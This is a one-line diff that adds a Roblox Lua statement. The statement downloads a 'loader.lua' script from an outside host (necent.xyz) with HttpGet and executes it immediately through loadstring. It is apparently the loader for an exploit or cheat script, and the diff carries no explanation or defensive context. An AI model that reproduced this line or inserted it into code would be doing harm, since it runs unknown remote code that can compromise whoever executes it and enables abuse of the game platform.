@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://necent.xyz/Vext/loader.lua"))()
